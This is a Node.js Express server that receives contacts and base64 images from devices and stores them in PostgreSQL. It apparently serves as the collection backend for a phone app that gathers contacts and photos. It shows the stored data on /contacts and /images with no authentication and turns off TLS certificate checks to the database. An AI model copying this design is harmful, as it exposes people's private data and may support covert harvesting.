const express = require("express");
const bodyParser = require("body-parser");
const { Pool } = require("pg");

const app = express();
app.use(bodyParser.json({ limit: "50mb" }));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// DB setup
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact_data TEXT UNIQUE,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_data TEXT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
  `);
}
initDB();

// Receive data
app.post("/receive", async (req, res) => {
  try {
    const { type, device_id, data } = req.body;

    if (type === "contacts") {
      await pool.query(
        "INSERT INTO contacts (device_id, contact_data) VALUES ($1, $2) ON CONFLICT DO NOTHING",
        [device_id, data]
      );
    }

    if (type === "images") {
      await pool.query(
        "INSERT INTO images (device_id, image_data) VALUES ($1, $2)",
        [device_id, data]
      );
    }

    res.send("Saved");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error");
  }
});

// View contacts
app.get("/contacts", async (req, res) => {
  const result = await pool.query("SELECT * FROM contacts ORDER BY id DESC");
  res.json(result.rows);
});

// View images
app.get("/images", async (req, res) => {
  const result = await pool.query("SELECT * FROM images ORDER BY id DESC");

  let html = "<h1>Images</h1>";

  result.rows.forEach(row => {
    html += `
      <div style="margin:10px;">
        <img src="data:image/jpeg;base64,${row.image_data}" width="250"/>
      </div>
    `;
  });

  res.send(html);
});

// Home
app.get("/", (req, res) => {
  res.send("Backend Running ✅");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running"));
